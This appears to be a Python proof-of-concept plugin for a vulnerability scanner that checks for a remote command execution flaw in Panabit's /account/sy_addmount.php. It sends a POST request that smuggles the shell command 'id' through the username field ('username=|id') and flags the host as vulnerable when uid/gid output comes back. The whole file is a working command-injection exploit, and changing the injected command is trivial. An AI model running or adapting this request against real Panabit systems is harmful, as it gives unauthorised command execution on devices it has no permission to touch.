#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Panabit sy_addmount.php 远程命令执行',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      "Content-Type":"application/x-www-form-urlencoded",
      }
  target = '/account/sy_addmount.php'
  data = '''username=|id'''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'uid.*?gid.*?groups.*?',res.text,re.S):
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret